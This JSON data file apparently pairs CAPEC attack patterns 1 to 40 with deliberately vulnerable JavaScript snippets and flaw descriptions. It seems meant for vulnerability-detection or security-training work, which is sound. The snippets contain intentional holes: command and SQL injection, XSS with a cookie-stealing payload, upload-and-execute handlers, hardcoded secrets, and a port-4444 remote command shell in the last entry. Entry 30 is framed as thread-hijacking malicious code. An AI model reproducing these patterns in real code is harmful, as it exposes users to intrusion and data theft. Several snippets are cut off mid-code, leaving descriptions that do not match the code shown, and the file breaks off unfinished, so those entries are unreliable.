[
    {
        "capec_id": "1",
        "capec_name": "Accessing Functionality Not Properly Constrained by ACLs",
        "code_snippet": "`\nconst express = require('express');\nconst app = express();\nconst fs = require('fs');\n\n// Misconfigured default permissions and authorization\nconst users = {\n  'admin': { role: 'admin'",
        "description": "\"This code demonstrates missing access control implementations where sensitive endpoints and file upload functionality are exposed without proper authorization checks. It includes improper file permissions, unrestricted file uploads, and unprotected administrative endpoints that could be accessed by any user. The server also binds to all available network interfaces (0.0.0.0) without restrictions.\""
    },
    {
        "capec_id": "2",
        "capec_name": "Inducing Account Lockout",
        "code_snippet": "`\nconst loginAttempts = {",
        "description": "\"This code implements an overly restrictive account lockout mechanism that can be exploited for denial of service. The authentication system locks an account for a full hour after just three failed attempts, with no way to distinguish between legitimate users and attackers. The implementation also lacks rate limiting, IP-based tracking, or administrative override capabilities, making it easy for attackers to intentionally trigger lockouts on target accounts.\""
    },
    {
        "capec_id": "3",
        "capec_name": "Using Leading 'Ghost' Character Sequences to Bypass Input Filters",
        "code_snippet": "function verifyFilePath(userInput) {\n    // Simple path validation\n    if (userInput.includes('../') || userInput.includes('..\\\\')) {\n        return false;\n    }\n    \n    // Decoding happens after validation\n    const decodedPath = decodeURIComponent(userInput);\n    \n    // Access the file\n    const filePath = '/var/www/files/' + decodedPath;\n    return require('fs').readFileSync(filePath);\n}",
        "description": "This vulnerable code attempts to validate a file path but performs validation before decoding the input. An attacker could bypass the validation by URL-encoding '../' (e.g., '%2E%2E%2F'), which would pass the initial check but decode to '../' after validation, potentially allowing directory traversal."
    },
    {
        "capec_id": "4",
        "capec_name": "Using Alternative IP Address Encodings",
        "code_snippet": "function authenticateUser(clientIP) {\n    // Vulnerable IP-based authentication\n    const trustedIPs = ['192.168.1.1', '10.0.0.1'];\n    \n    // No validation of IP format or encoding\n    if (trustedIPs.includes(clientIP)) {\n        const dns = require('dns');\n        \n        // Vulnerable reverse DNS lookup\n        dns.reverse(clientIP, (err, hostnames) => {\n            if (hostnames && hostnames[0].endsWith('.trusted-domain.com')) {\n                // Grant access based on IP and hostname\n                grantAccess(clientIP);\n            }\n        });\n    }\n\n    function grantAccess(ip) {\n        // Establish privileged connection without proper endpoint verification\n        const socket = new WebSocket(`ws://${ip}:8080`);\n        socket.send('AUTHORIZED');\n    }\n}",
        "description": "This vulnerable code demonstrates multiple security issues: reliance on IP addresses for authentication, improper handling of IP address formats/encodings, unsafe reverse DNS resolution for security decisions, and insufficient verification of communication endpoints. The code accepts IP addresses without proper validation, performs unreliable reverse DNS lookups, and establishes connections without proper endpoint verification."
    },
    {
        "capec_id": "5",
        "capec_name": "Blue Boxing",
        "code_snippet": "`\nconst phoneSystem = {\n  supervisorSignals: new Map(),\n  isAuthenticated: false,\n\n  initializeLine(signal, callback) {\n    // Vulnerable: No validation of signal authenticity\n    this.supervisorSignals.set(signal, callback);",
        "description": "\"This code simulates a vulnerable phone system that processes supervisor signals without proper authentication, authorization, or signal verification. It allows replay attacks and unauthorized command execution through supervisor signal impersonation, similar to the blue boxing attack pattern. The code lacks proper channel endpoint verification, message integrity checks, and can be exploited through capture-replay attacks.\""
    },
    {
        "capec_id": "6",
        "capec_name": "Argument Injection",
        "code_snippet": "function executeCommand(userInput) {\n    const command = 'echo ' + userInput;\n    const exec = require('child_process').exec;\n    return new Promise((resolve, reject) => {\n        exec(command, (error, stdout, stderr) => {\n            if (error) {\n                reject(error);\n                return;\n            }\n            resolve(stdout);\n        });\n    });\n}\n\napp.post('/process', async (req, res) => {\n    try {\n        const result = await executeCommand(req.body.command);\n        res.send(result);\n    } catch(err) {\n        res.status(500).send(err);\n    }\n});",
        "description": "This code demonstrates a vulnerable command injection scenario where user input is directly concatenated into a shell command without proper validation or sanitization. The function accepts arbitrary user input and executes it as part of a shell command, allowing attackers to inject malicious commands by using shell metacharacters."
    },
    {
        "capec_id": "7",
        "capec_name": "Blind SQL Injection",
        "code_snippet": "const express = require('express');\nconst mysql = require('mysql');\nconst app = express();\n\nconst db = mysql.createConnection({\n    host: 'localhost',\n    user: 'admin',\n    password: 'password123',\n    database: 'userdb'\n});\n\napp.get('/user', (req, res) => {\n    let userId = req.query.id;\n    let query = 'SELECT * FROM users WHERE id = ' + userId;\n    \n    try {\n        db.query(query, (err, result) => {\n            if (result && result.length > 0) {\n                res.json({ success: true });\n            } else {\n                res.json({ success: false });\n            }\n        });\n    } catch(err) {\n        res.json({ success: false });\n    }\n});",
        "description": "This code demonstrates a blind SQL injection vulnerability where user input is directly concatenated into SQL query without sanitization. The error messages are suppressed and only boolean responses are returned, making it vulnerable to blind SQL injection attacks. An attacker can exploit this by sending crafted payloads and observing the true/false responses to gradually extract information from the database."
    },
    {
        "capec_id": "8",
        "capec_name": "Buffer Overflow in an API Call",
        "code_snippet": "function processUserData(data) {\n  let buffer = new Buffer(16);\n  let inputData = Buffer.from(data);\n  \n  // Vulnerable copy without size check\n  for(let i = 0; i < inputData.length; i++) {\n    buffer[i] = inputData[i];\n  }\n  \n  // Vulnerable shared library function\n  function parseInput(buf) {\n    let size = parseInt(buf.toString());\n    let newBuf = new Buffer(size);\n    return Buffer.concat([buffer, newBuf]);\n  }\n  \n  // Process data without bounds checking\n  let result = parseInput(buffer);\n  return result;\n}",
        "description": "This code demonstrates a vulnerable shared library function that processes user input without proper buffer size validation. It includes multiple vulnerabilities: buffer overflow through unchecked copying, improper bounds checking, and integer-related memory allocation issues. The shared nature of the parseInput function makes it particularly dangerous as it could affect multiple parts of an application that use this library code."
    },
    {
        "capec_id": "9",
        "capec_name": "Buffer Overflow in Local Command-Line Utilities",
        "code_snippet": "function executeCommand(userInput) {\n  const buffer = new Buffer(64);\n  let commandStr = 'ls ' + userInput;\n  buffer.write(commandStr, 0);\n  \n  for(let i = 0; i <= buffer.length + 10; i++) {\n    if(buffer[i] === 0x3b) { // semicolon\n      buffer[i] = 0x20; // replace with space\n    }\n  }\n  \n  const childProcess = require('child_process');\n  return childProcess.execSync(buffer.toString());\n}",
        "description": "This vulnerable code demonstrates command injection and buffer overflow issues in a command-line utility wrapper. It uses a fixed-size buffer without proper bounds checking, allows unfiltered user input into command execution, and contains an out-of-bounds array access. The buffer manipulation attempt to sanitize semicolons is flawed and can be bypassed, potentially leading to command injection and privilege escalation."
    },
    {
        "capec_id": "10",
        "capec_name": "Buffer Overflow via Environment Variables",
        "code_snippet": "function processEnvData(envVar) {\n    let buffer = new Buffer(256);\n    let data = process.env[envVar] || '';\n    \n    // Vulnerable: no size checking before copy\n    buffer.write(data);\n    \n    // Process environment data without validation\n    let configPath = process.env['CONFIG_PATH'];\n    let command = 'cat ' + configPath + ' >> ' + buffer.toString();\n    \n    // Vulnerable: command injection through environment variable\n    require('child_process').execSync(command);\n    \n    return buffer;\n}",
        "description": "This code demonstrates a vulnerable implementation that copies environment variable data into a fixed-size buffer without bounds checking, potentially leading to buffer overflow. It also includes command injection vulnerability through unchecked environment variables and improper input validation. The function assumes environment variables are trusted and doesn't sanitize or validate the input before using it in command execution."
    },
    {
        "capec_id": "11",
        "capec_name": "Cause Web Server Misclassification",
        "code_snippet": "const express = require('express');\nconst app = express();\nconst multer = require('multer');\n\nconst storage = multer.diskStorage({\n    destination: './uploads/',\n    filename: (req, file, cb) => {\n        cb(null, file.originalname);\n    }\n});\n\nconst upload = multer({ storage: storage });\n\napp.post('/upload', upload.single('file'), (req, res) => {\n    const uploadedFile = req.file;\n    const fileExt = uploadedFile.originalname.split('.').pop().toLowerCase();\n\n    if(fileExt === 'php') {\n        require('./uploads/' + uploadedFile.filename);\n    } else if(fileExt === 'jpg') {\n        processImage(uploadedFile.filename);\n    } else if(fileExt === 'txt') {\n        processText(uploadedFile.filename);\n    }\n\n    res.send('File processed');\n});",
        "description": "This code demonstrates vulnerable file upload handling where the server relies solely on the file extension to determine how to process uploaded files. It allows unrestricted file uploads and executes different actions based on file extensions without proper validation, potentially allowing attackers to upload malicious files with spoofed extensions or trigger unexpected server behaviors."
    },
    {
        "capec_id": "12",
        "capec_name": "Choosing Message Identifier",
        "code_snippet": "`\nconst messageChannel = {\n    channels: {",
        "description": "\"A vulnerable message channel implementation that allows clients to subscribe to channels and exchange messages. The code lacks proper authentication, message integrity checks, and sender validation, allowing attackers to intercept messages intended for other clients, impersonate other users, and potentially gain unauthorized access to sensitive information through message manipulation.\""
    },
    {
        "capec_id": "13",
        "capec_name": "Subverting Environment Variable Values",
        "code_snippet": "const express = require('express');\nconst app = express();\nconst fs = require('fs');\n\napp.get('/config', (req, res) => {\n  const configPath = req.query.path || 'config.json';\n  process.env.APP_CONFIG = req.query.config || process.env.APP_CONFIG;\n  \n  const userRole = req.headers['user-role'];\n  \n  fs.readFile(configPath, 'utf8', (err, data) => {\n    if (err) {\n      res.status(500).send('Error reading config');\n      return;\n    }\n    \n    const config = JSON.parse(data);\n    config.dbConnection = process.env.APP_CONFIG;\n    \n    const command = `update-config ${config.dbConnection}`;\n    require('child_process').exec(command);\n    \n    res.json(config);\n  });\n});\n\napp.listen(3000);",
        "description": "This vulnerable code allows unauthorized modification of environment variables and configuration settings through HTTP requests. It lacks input validation, proper authorization checks, and contains multiple injection vectors through file paths and command execution. The code exposes sensitive configuration data and allows direct manipulation of system settings through environment variables."
    },
    {
        "capec_id": "14",
        "capec_name": "Client-side Injection-induced Buffer Overflow",
        "code_snippet": "function processUserData(userInput) {\n  let buffer = new Array(16);\n  let inputLength = userInput.length;\n  \n  // Vulnerable: No size check before copy\n  for(let i = 0; i < inputLength; i++) {\n    buffer[i] = userInput[i];\n  }\n  \n  // Vulnerable: No input validation\n  let command = 'process ' + buffer.join('');\n  \n  // Vulnerable: Integer overflow potential\n  let allocSize = inputLength * 2;\n  let newBuffer = new Array(allocSize);\n  \n  // Vulnerable: No bounds checking\n  for(let j = 0; j <= allocSize; j++) {\n    newBuffer[j] = buffer[j];\n  }\n  \n  return eval(command);\n}",
        "description": "This code demonstrates a vulnerable function that processes user input without proper bounds checking, size validation, or input sanitization. It includes multiple buffer overflow vulnerabilities through unchecked array copying, potential integer overflow in memory allocation calculation, and command injection through direct concatenation and eval execution."
    },
    {
        "capec_id": "15",
        "capec_name": "Command Delimiters",
        "code_snippet": "function executeCommand(userInput) {\n  // Attempt to filter dangerous characters using a denylist\n  const sanitizedInput = userInput.replace(/[;&|`]/g, '');\n  \n  // Vulnerable command construction using string concatenation\n  const command = 'mysql -u admin -p password -e \"SELECT * FROM users WHERE name=' + sanitizedInput + '\"';\n  \n  // Execute the command using child_process\n  const exec = require('child_process');\n  exec.execSync(command);\n}",
        "description": "The code demonstrates command injection vulnerability by using an incomplete denylist for input sanitization and direct string concatenation for command construction. An attacker could bypass the filter using alternate delimiters or escape sequences not included in the denylist, allowing arbitrary command execution."
    },
    {
        "capec_id": "16",
        "capec_name": "Dictionary-based Password Attack",
        "code_snippet": "const users = {\n  'admin': 'password123',\n  'user': 'welcome',\n  'john': 'letmein'\n};\n\nfunction login(username, password) {\n  if (users[username] && users[username] === password) {\n    return true;\n  }\n  return false;\n}\n\nfunction authenticateUser(username, password) {\n  // No password complexity requirements\n  // No password expiration\n  // No multi-factor authentication\n  // No rate limiting or account lockout\n  if (login(username, password)) {\n    console.log('Login successful');\n    return true;\n  }\n  console.log('Login failed');\n  return false;\n}",
        "description": "This vulnerable code demonstrates a simple authentication system with multiple security flaws. It stores passwords in plaintext, lacks password complexity requirements, has no password aging mechanism, implements no rate limiting for failed attempts, and relies on single-factor authentication. The passwords used are common dictionary words, making them susceptible to dictionary attacks."
    },
    {
        "capec_id": "17",
        "capec_name": "Using Malicious Files",
        "code_snippet": "const fs = require('fs');\nconst express = require('express');\nconst app = express();\n\napp.post('/upload', (req, res) => {\n  const uploadedFile = req.files.file;\n  const filePath = '/uploads/' + uploadedFile.name;\n  \n  fs.writeFileSync(filePath, uploadedFile.data);\n  \n  // Vulnerable execution of uploaded file\n  if(filePath.endsWith('.js')) {\n    const exec = require('child_process');\n    exec.execSync('node ' + filePath, {\n      uid: process.getuid(),\n      gid: process.getgid()\n    });\n  }\n  \n  res.send('File uploaded and executed!');\n});\n\napp.listen(3000);",
        "description": "This code demonstrates a vulnerable file upload and execution system that allows arbitrary file uploads and executes JavaScript files without proper permission checks, ownership validation, or privilege management. The code directly executes uploaded files with the web server's privileges, fails to implement proper authorization, and doesn't validate file paths or enforce least privilege principles."
    },
    {
        "capec_id": "18",
        "capec_name": "XSS Targeting Non-Script Elements",
        "code_snippet": "function displayUserProfile(userId) {\n  fetch('/api/user/' + userId)\n    .then(response => response.json())\n    .then(data => {\n      document.getElementById('profile').innerHTML = `\n        <div class=\"user-info\">\n          <img src=\"${data.avatarUrl}\" onerror=\"alert(document.cookie)\">\n          <div class=\"details\">\n            <h2>${data.name}</h2>\n            <p><!-- ${data.comments} --></p>\n            <div>${data.customHtml}</div>\n          </div>\n        </div>\n      `;\n    });\n}",
        "description": "This code demonstrates multiple XSS vulnerabilities through unvalidated input being inserted into HTML elements. It accepts user data and directly injects it into the DOM, including potentially malicious content in img tags, comments, and regular HTML elements without proper sanitization."
    },
    {
        "capec_id": "19",
        "capec_name": "Embedding Scripts within Scripts",
        "code_snippet": "function loadExternalWidget(widgetUrl) {\n    let script = document.createElement('script');\n    script.src = widgetUrl;\n    script.async = true;\n    document.body.appendChild(script);\n}\n\nfunction processUserInput(input) {\n    let div = document.createElement('div');\n    div.innerHTML = input;  // XSS vulnerability\n    document.getElementById('content').innerHTML += div.innerHTML;\n    \n    // Load external widget without validation\n    loadExternalWidget('http://' + input + '/widget.js');\n}\n\n// Example usage\nlet userInput = new URL(window.location.href).searchParams.get('widget');\nprocessUserInput(userInput);",
        "description": "Vulnerable script that combines unvalidated external script loading with XSS. It allows arbitrary JavaScript execution through user input and loads external widgets without proper validation or access control."
    },
    {
        "capec_id": "20",
        "capec_name": "Encryption Brute Forcing",
        "code_snippet": "const crypto = require('crypto');\n\nconst weakKey = '1234567890123456';\nconst staticIV = Buffer.from('0000000000000000');\n\nfunction encryptData(data) {\n  try {\n    const cipher = crypto.createCipheriv('aes-128-cbc', weakKey, staticIV);\n    let encrypted = cipher.update(data, 'utf8', 'hex');\n    encrypted += cipher.final('hex');\n    return encrypted;\n  } catch (err) {\n    console.error('Encryption failed:', err);\n    return null;\n  }\n}",
        "description": "This code demonstrates multiple cryptographic vulnerabilities: using a weak, hard-coded encryption key, a static and predictable Initialization Vector (IV), and a relatively weak cipher mode (AES-128-CBC). The combination of these issues makes the encryption susceptible to brute force attacks, especially given the predictable nature of both the key and IV."
    },
    {
        "capec_id": "21",
        "capec_name": "Exploitation of Trusted Identifiers",
        "code_snippet": "// Authentication middleware\nconst authenticate = (req, res, next) => {\n  const sessionId = req.cookies.sessionId || req.query.sessionId;\n  \n  // Vulnerable session validation\n  if (sessionId) {\n    const user = activeUsers[sessionId];\n    if (user) {\n      req.user = user;\n      next();\n    }\n  }\n\n  // Set new session without invalidating old ones\n  const newSessionId = Math.random().toString(36).substr(2, 8);\n  res.cookie('sessionId', newSessionId, {\n    expires: new Date(Date.now() + 365 * 24 * 60 * 60 * 1000),\n    httpOnly: false\n  });\n  \n  activeUsers[newSessionId] = { userId: req.body.userId };\n  next();\n}",
        "description": "This code demonstrates multiple authentication vulnerabilities including weak session ID generation, failure to invalidate existing sessions, use of persistent cookies with sensitive data, and insufficient session validation. The code allows session riding through easily guessable session IDs and doesn't properly validate the origin of requests."
    },
    {
        "capec_id": "22",
        "capec_name": "Exploiting Trust in Client",
        "code_snippet": "const authenticateUser = (clientToken) => {\n  // No validation of token format or signature\n  const decodedToken = atob(clientToken);\n  \n  // Trusting client-provided data without verification\n  const [username, role] = decodedToken.split(':');\n  \n  // Directly using client-provided role without server-side validation\n  if (role === 'admin') {\n    return {\n      isAuthenticated: true,\n      userData: {\n        username: username,\n        role: role,\n        secretKey: process.env.API_SECRET // Exposing sensitive data\n      }\n    };\n  }\n  \n  return { isAuthenticated: false };\n};\n\nconst handleClientRequest = (req, res) => {\n  const authResult = authenticateUser(req.headers.authorization);\n  if (authResult.isAuthenticated) {\n    // Grant access based on unverified client claims\n    grantAdminAccess(authResult.userData);\n  }\n};",
        "description": "This vulnerable code demonstrates poor authentication implementation where client-provided tokens are trusted without proper validation. It accepts a base64 encoded token, blindly trusts the role claim within it, and exposes sensitive information. The code lacks proper input validation, token signature verification, and implements weak authentication mechanisms that are susceptible to spoofing attacks."
    },
    {
        "capec_id": "23",
        "capec_name": "File Content Injection",
        "code_snippet": "const uploadHandler = (req, res) => {\n  const uploadedFile = req.files.file;\n  const fileName = uploadedFile.name;\n  \n  // No validation of file type or content\n  uploadedFile.mv(`./uploads/${fileName}`, (err) => {\n    if(err) return res.status(500).send(err);\n    \n    // Dangerous auto-execution of uploaded files\n    if(fileName.endsWith('.js')) {\n      require(`./uploads/${fileName}`);\n    }\n    \n    res.send('File uploaded successfully');\n  });\n};\n\napp.post('/upload', uploadHandler);",
        "description": "This vulnerable code demonstrates unrestricted file uploads with automatic execution. It allows any file type to be uploaded without validation and automatically executes JavaScript files based solely on the file extension. The code lacks input validation, relies on file extensions for determining behavior, and enables potential execution of malicious code through uploaded files."
    },
    {
        "capec_id": "24",
        "capec_name": "Filter Failure through Buffer Overflow",
        "code_snippet": "function processUserData(userData) {\n  let buffer = new Array(100);\n  let inputLen = userData.length;\n  \n  // Vulnerable copy without size check\n  for (let i = 0; i <= inputLen; i++) {\n    buffer[i] = userData[i];\n  }\n  \n  // Attempt to filter content after copy\n  let filtered = '';\n  for (let i = 0; i < buffer.length; i++) {\n    if (buffer[i] && buffer[i].length < 50) {\n      filtered += buffer[i].replace(/[<>]/g, '');\n    }\n  }\n  \n  return eval('processData(\"' + filtered + '\")');\n}",
        "description": "This code is vulnerable to buffer overflow and filter bypass through oversized input. It copies user data into a fixed-size buffer without proper bounds checking, attempts to filter content after an unsafe copy operation, and uses eval() with insufficiently sanitized data. The filter can be overwhelmed with large input, potentially leading to buffer overflow and code injection."
    },
    {
        "capec_id": "25",
        "capec_name": "Forced Deadlock",
        "code_snippet": "`\n    // Shared resource\n    let resource1 = { locked: false",
        "description": "\"This code demonstrates a classic deadlock scenario where two threads attempt to acquire two resources in different orders. Thread1 tries to lock resource1 then resource2, while Thread2 tries to lock resource2 then resource1. When both threads acquire their first resource and attempt to acquire their second resource simultaneously, they enter a deadlock state where each thread is waiting indefinitely for a resource held by the other.\""
    },
    {
        "capec_id": "26",
        "capec_name": "Leveraging Race Conditions",
        "code_snippet": "`\n// Vulnerable file reading operation with race condition\nfunction readUserConfig(filename) {\n    // Check if file exists\n    if (fs.existsSync(filename)) {\n        // Time gap between check and usage (TOCTOU vulnerability)\n        setTimeout(() => {\n            // Attempt to read file - attacker could have replaced it\n            fs.readFile(filename, 'utf8', (err, data) => {\n                if (err) {\n                    console.error('Error reading file');\n                    return;",
        "description": "\"This code demonstrates two classic race condition vulnerabilities: 1) A Time-Of-Check-Time-Of-Use (TOCTOU) vulnerability in file operations where an attacker can replace the file between the check and use, and 2) A shared resource race condition where concurrent access to a counter can lead to lost updates due to improper synchronization. Both scenarios can be exploited by an attacker to manipulate program behavior.\""
    },
    {
        "capec_id": "27",
        "capec_name": "Leveraging Race Conditions via Symbolic Links",
        "code_snippet": "`const fs = require('fs');\nconst path = require('path');\n\nfunction writeToTempFile(data, targetPath) {\n  const tempFileName = 'temp_' + Math.random();\n  const tempPath = path.join('/tmp', tempFileName);\n  \n  // Check if temp file exists\n  if (!fs.existsSync(tempPath)) {\n    // Vulnerable window between check and write\n    // where attacker can create symlink\n    setTimeout(() => {\n      try {\n        fs.writeFileSync(tempPath, data);\n        fs.chmodSync(tempPath, '644');\n        fs.renameSync(tempPath, targetPath);",
        "description": "\"This code demonstrates a TOCTOU vulnerability in file operations where there's a race condition between checking for a temporary file's existence and writing to it. The code doesn't properly handle symbolic links and has an unsafe delay between checking and writing, allowing an attacker to potentially create a symlink during this window. The file permissions are also set after writing, creating another race condition. The lack of proper file locking and synchronization makes it vulnerable to symlink attacks.\""
    },
    {
        "capec_id": "28",
        "capec_name": "Fuzzing",
        "code_snippet": "function processUserData(userInput) {\n  // No input validation\n  let command = 'SELECT * FROM users WHERE id = ' + userInput;\n  \n  try {\n    // Directly using user input in system commands\n    const result = require('child_process').execSync(command);\n    return result;\n  } catch(error) {\n    // Revealing sensitive information in error messages\n    return {\n      error: error.message,\n      command: command,\n      stack: error.stack,\n      systemPath: process.cwd()\n    };\n  }\n}",
        "description": "This code demonstrates multiple vulnerabilities that could be discovered through fuzzing: SQL injection due to unvalidated concatenation, command injection through direct use of user input in system commands, and information disclosure through detailed error messages. The lack of input sanitization and validation makes it susceptible to various injection attacks that could be discovered through automated fuzzing techniques."
    },
    {
        "capec_id": "29",
        "capec_name": "Leveraging Time-of-Check and Time-of-Use (TOCTOU) Race Conditions",
        "code_snippet": "\"const fs = require('fs');\n\nfunction processUserData(fileName) {\n  // Check if file exists\n  if (fs.existsSync(fileName)) {\n    // Time delay between check and use\n    setTimeout(() => {\n      try {\n        // Attempt to read and process the file\n        const data = fs.readFileSync(fileName);\n        processData(data);",
        "description": "\"This code demonstrates a classic TOCTOU vulnerability. It checks for file existence using existsSync() and then attempts to read the file after a delay. During this delay, an attacker could modify, delete, or replace the file, causing the program to operate on different data than what was initially verified. The lack of proper file locking or atomic operations creates a race condition between the check and use of the file resource.\""
    },
    {
        "capec_id": "30",
        "capec_name": "Hijacking a Privileged Thread of Execution",
        "code_snippet": "// Create a shared worker for privilege escalation\nconst worker = new SharedWorker('worker.js');\n\n// Malicious code to hijack thread execution\nfunction hijackThread() {\n    let target = process.mainModule;\n    const originalThread = target.exports;\n\n    // Inject malicious code into running process\n    target.exports = new Proxy(originalThread, {\n        get: function(target, property) {\n            if (property === 'runCommand') {\n                return function(cmd) {\n                    // Unsanitized command execution\n                    require('child_process').execSync(cmd);\n                }\n            }\n            return target[property];\n        }\n    });\n\n    // Race condition exploitation\n    setInterval(() => {\n        worker.port.postMessage({\n            type: 'elevate',\n            payload: Buffer.from(process.memoryUsage().heapUsed.toString()).toString('base64')\n        });\n    }, 100);\n}\n\nhijackThread();",
        "description": "This code demonstrates thread hijacking by creating a malicious proxy that intercepts thread execution, enabling privilege escalation and command injection. It uses a shared worker to exploit race conditions and manipulates process memory, while executing unsanitized commands with elevated privileges. The code includes improper privilege context switching and potential exposure of sensitive information through shared resources."
    },
    {
        "capec_id": "31",
        "capec_name": "Accessing/Intercepting/Modifying HTTP Cookies",
        "code_snippet": "// Cookie handling for user authentication\nfunction handleUserLogin(username, password) {\n    // Store sensitive credentials in cookie without encryption\n    document.cookie = 'auth=' + username + ':' + password + ';path=/;';\n    \n    // Set session token without proper validation\n    let sessionId = Math.random().toString();\n    document.cookie = 'sessionId=' + sessionId + ';path=/;';\n    \n    // Store user preferences and role in cleartext\n    document.cookie = 'userRole=admin;path=/;';\n    document.cookie = 'userPrefs=' + JSON.stringify({\n        creditCard: '4111-1111-1111-1111',\n        address: '123 Main St'\n    }) + ';path=/;';\n    \n    // Client-side role verification without server validation\n    function checkAdminAccess() {\n        return document.cookie.includes('userRole=admin');\n    }\n    \n    // Accept cookie values without sanitization\n    function getUserData() {\n        let cookies = document.cookie.split(';');\n        return cookies.reduce((data, cookie) => {\n            let [key, value] = cookie.split('=');\n            data[key.trim()] = value;\n            return data;\n        }, {});\n    }\n}",
        "description": "Vulnerable cookie handling implementation that stores sensitive data in cleartext cookies, lacks proper validation and encryption, performs client-side security checks, and accepts cookie values without proper sanitization. It demonstrates multiple security issues including cleartext storage of credentials, improper session management, and reliance on client-side security controls."
    },
    {
        "capec_id": "32",
        "capec_name": "XSS Through HTTP Query Strings",
        "code_snippet": "app.get('/search', function(req, res) {\n    let searchQuery = req.query.q;\n    let html = '<div class=\"results\">Search results for: ' + searchQuery + '</div>';\n    res.send(html);\n})",
        "description": "A vulnerable Node.js endpoint that directly embeds user input from a query parameter into HTML output without sanitization, allowing XSS attacks through malicious query strings like '?q=<script>alert(document.cookie)</script>'"
    },
    {
        "capec_id": "33",
        "capec_name": "HTTP Request Smuggling",
        "code_snippet": "`\nconst http = require('http');\nconst proxy = http.createServer((clientReq, clientRes) => {\n  let body = '';\n  clientReq.on('data', chunk => {\n    body += chunk;",
        "description": "\"A vulnerable HTTP proxy implementation that demonstrates HTTP request smuggling vulnerabilities. The code fails to properly validate Content-Length headers, doesn't sanitize CRLF sequences, and blindly forwards requests without proper validation. This allows attackers to potentially smuggle requests through the proxy to the backend server, leading to request smuggling, HTTP response splitting, and potential SSRF attacks.\""
    },
    {
        "capec_id": "34",
        "capec_name": "HTTP Response Splitting",
        "code_snippet": "const http = require('http');\nconst server = http.createServer((req, res) => {\n    const userInput = req.query.data;\n    // Vulnerable: No sanitization of user input before including in header\n    res.setHeader('X-Custom-Header', userInput);\n    \n    // Vulnerable: Multiple response headers due to CRLF injection\n    res.writeHead(200, {\n        'Content-Type': 'text/html',\n        'Set-Cookie': userInput\n    });\n    \n    // Vulnerable: Confused deputy due to improper header handling\n    if(req.headers['Transfer-Encoding'] && req.headers['Content-Length']) {\n        res.write(req.body);\n    }\n    \n    res.end('Response completed');\n});\n\nserver.listen(3000);",
        "description": "This code demonstrates HTTP response splitting/smuggling vulnerabilities by failing to sanitize user input in HTTP headers, allowing CRLF injection, and implementing inconsistent HTTP request handling. It enables an attacker to inject malicious content into HTTP responses and manipulate how downstream components process the response."
    },
    {
        "capec_id": "35",
        "capec_name": "Leverage Executable Code in Non-Executable Files",
        "code_snippet": "const fs = require('fs');\nconst config = require('./config.json');\nconst template = fs.readFileSync(config.templatePath, 'utf8');\n\nfunction processUserTemplate(userInput) {\n    const customizedTemplate = template.replace('${userContent}', userInput);\n    eval(customizedTemplate);\n    fs.writeFileSync(config.outputPath, customizedTemplate);\n    require(config.outputPath);\n}",
        "description": "This code loads a template file from a configurable path, allows user input to be injected into the template, evaluates it dynamically, saves it to a file, and then requires it - making it vulnerable to code injection through both template manipulation and configuration file tampering. The code lacks input sanitization, proper file path validation, and executes with full privileges without any access control checks."
    },
    {
        "capec_id": "36",
        "capec_name": "Using Unpublished Interfaces or Functionality",
        "code_snippet": "// Backend API service\nclass AdminService {\n    constructor() {\n        this._debugMode = false;\n    }\n\n    // Undocumented debug endpoint\n    _enableDebugMode() {\n        this._debugMode = true;\n        return this.getAllSystemData();\n    }\n\n    getAllSystemData() {\n        return {\n            users: db.getAllUsers(),\n            configs: db.getSystemConfigs(),\n            secrets: db.getSecrets()\n        };\n    }\n\n    handleRequest(path, params) {\n        if (path === '/debug' && params.mode === 'enable') {\n            return this._enableDebugMode();\n        }\n        return this.normalOperation();\n    }\n}\n\nconst adminService = new AdminService();\napp.get('*', (req, res) => {\n    res.json(adminService.handleRequest(req.path, req.query));\n});",
        "description": "This vulnerable code demonstrates an undocumented debug endpoint that provides unrestricted access to sensitive system data without any authentication or authorization checks. The hidden '_enableDebugMode' function can be accessed through a public API endpoint, exposing internal system data to unauthorized users."
    },
    {
        "capec_id": "37",
        "capec_name": "Retrieve Embedded Sensitive Data",
        "code_snippet": "class UserDataManager {\n  constructor() {\n    this.cache = {};\n  }\n\n  saveUserCredentials(userId, password) {\n    // Store sensitive data in cleartext\n    this.cache[userId] = {\n      password: password,\n      creditCard: '4532-7153-6219-0486',\n      ssn: '123-45-6789'\n    };\n    localStorage.setItem('user_' + userId, JSON.stringify(this.cache[userId]));\n  }\n\n  removeUser(userId) {\n    // Improper cleanup of sensitive data\n    delete this.cache[userId];\n    localStorage.removeItem('user_' + userId);\n    // Memory still contains traces of sensitive data\n  }\n\n  decommissionSystem() {\n    // Incomplete data removal\n    this.cache = {};\n    localStorage.clear();\n    // Sensitive data remains in memory and browser cache\n  }\n}",
        "description": "This code demonstrates multiple vulnerabilities related to improper handling of sensitive data, including cleartext storage in memory and localStorage, incomplete data removal during cleanup operations, and lack of proper data sanitization when decommissioning the system. The code stores passwords, credit card numbers, and SSNs in plaintext and fails to properly clear sensitive data from memory when it's no longer needed."
    },
    {
        "capec_id": "38",
        "capec_name": "Leveraging/Manipulating Configuration File Search Paths",
        "code_snippet": "const childProcess = require('child_process');\nconst path = require('path');\n\nconst userProvidedPath = process.env.USER_LIB_PATH || './lib';\nconst configFile = path.join(userProvidedPath, 'config.json');\n\nfunction executeCommand(command) {\n    const libPath = process.env.PATH + ':' + userProvidedPath;\n    process.env.PATH = libPath;\n    \n    const result = childProcess.execSync(command, {\n        env: { PATH: libPath },\n        shell: true\n    });\n    return result;\n}",
        "description": "This code demonstrates an insecure handling of search paths by allowing user-controlled input to influence the library path and command execution environment. It modifies the system PATH environment variable with untrusted input and executes commands using this modified path, making it vulnerable to malicious library injection attacks."
    },
    {
        "capec_id": "39",
        "capec_name": "Manipulating Opaque Client-based Data Tokens",
        "code_snippet": "`\n// User authentication system with vulnerable cookie handling\napp.post('/login', (req, res) => {\n  const { username, password",
        "description": "\"This code demonstrates multiple vulnerabilities in handling client-side data through cookies. It stores sensitive user information in cleartext cookies, lacks integrity checks on received data, and blindly trusts client-provided parameters. An attacker can manipulate the cookie content or price parameter to bypass authentication or modify transaction amounts.\""
    },
    {
        "capec_id": "40",
        "capec_name": "Manipulating Writeable Terminal Devices",
        "code_snippet": "const net = require('net');\nconst exec = require('child_process').exec;\n\nconst server = net.createServer((socket) => {\n  socket.on('data', (data) => {\n    const command = data.toString();\n    exec(command, (error, stdout, stderr) => {\n      const result = stdout || stderr;\n      socket.write(result);\n    });\n  });\n});\n\nserver.listen(4444, '0.0.0.0', () => {\n  console.log('Terminal service running on port 4444');\n});",
